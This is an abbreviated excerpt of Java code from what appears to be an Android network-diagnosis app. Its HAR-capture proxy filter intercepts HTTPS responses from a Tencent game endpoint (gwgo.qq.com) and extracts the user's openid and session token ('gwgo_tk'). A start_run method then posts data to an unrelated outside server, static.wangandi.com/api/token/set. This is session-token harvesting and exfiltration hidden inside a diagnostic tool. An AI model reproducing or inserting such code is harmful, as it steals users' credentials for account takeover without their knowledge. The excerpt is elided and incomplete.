...
import cn.darkal.networkdiagnosis.Bean.ZhuoYaoToken;
...
public class HarCaptureFilter extends HttpsAwareFiltersAdapter {
    ...
    protected void captureResponseContent(HttpResponse httpResponse, byte[] fullMessage) {
        ...
        boolean isZhuoyao = false;
        if (this.harEntry.getRequest().getUrl().contains("publich5.gwgo.qq.com")) {
            isZhuoyao = true;
        }
        ...
        if (!forceBinary && BrowserMobHttpUtil.hasTextualContent(contentType)) {
            ...
            responseText = BaseEncoding.base64().encode(fullMessage);
        ...
        if (isZhuoyao) {
            try {
                ...
                ZhuoYaoToken zhuoYaoToken = new ZhuoYaoToken();
                zhuoYaoToken.OpenId = obj.getString("openid");
                zhuoYaoToken.Token = obj.getString("gwgo_tk");
                JSONObject o = new JSONObject();
                o.put("OpenId", obj.getString("openid"));
                o.put("Token", obj.getString("gwgo_tk"));
                Gson gson = new Gson();
//                final String body = gson.toJson(zhuoYaoToken);
    ...
    private void start_run(String body) throws Exception{
        byte[] data  = body.getBytes();
        String urlPath ="http://static.wangandi.com/api/token/set";
        //建立连接
        URL url = new URL(urlPath);
        HttpURLConnection httpConn=(HttpURLConnection)url.openConnection();
        httpConn.setRequestMethod("POST");     //设置以Post方式提交数据
